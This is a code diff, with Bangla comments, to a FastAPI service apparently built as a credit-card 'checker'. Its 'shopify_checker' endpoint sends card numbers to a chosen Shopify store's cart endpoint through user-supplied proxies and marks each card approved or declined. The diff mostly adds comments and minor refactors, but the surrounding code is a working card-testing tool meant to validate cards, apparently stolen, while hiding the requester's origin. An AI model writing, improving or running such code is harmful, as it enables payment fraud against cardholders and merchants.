@@ -10,7 +10,7 @@ app = FastAPI()
 def root():
     return {"message": "API Running"}
 
-# ========== মূল API (পুরোনো) ==========
+# ========== শুধু রিটার্ন (পুরোনো) ==========
 @app.get("/shopii")
 def shopii(
     cc: str = Query(...),
@@ -40,13 +40,17 @@ def shopify_checker(
         return {"error": "Invalid proxy format. Use ip:port:user:pass"}
     proxy_ip, proxy_port, proxy_user, proxy_pass = proxy_parts
     
+    # প্রক্সি ডিকশনারি
     proxies = {
         "http": f"http://{proxy_user}:{proxy_pass}@{proxy_ip}:{proxy_port}",
         "https": f"http://{proxy_user}:{proxy_pass}@{proxy_ip}:{proxy_port}"
     }
     
-    checkout_url = f"https://{site.replace('https://', '').replace('http://', '')}/cart.json"
+    # Shopify কার্ট URL
+    clean_site = site.replace("https://", "").replace("http://", "")
+    checkout_url = f"https://{clean_site}/cart.json"
     
+    # পেমেন্ট ডেটা
     payment_data = {
         "credit_card": {
             "number": card_number,
@@ -72,10 +76,11 @@ def shopify_checker(
         elapsed_time = round(time.time() - start_time, 2)
         result = response.json()
         
+        # স্ট্যাটাস চেক
         if "error" in result:
             status = "CARD_DECLINED"
             approved = False
-        elif "payment" in result and result["payment"]["status"] == "success":
+        elif "payment" in result and result["payment"].get("status") == "success":
             status = "CARD_APPROVED"
             approved = True
         else:
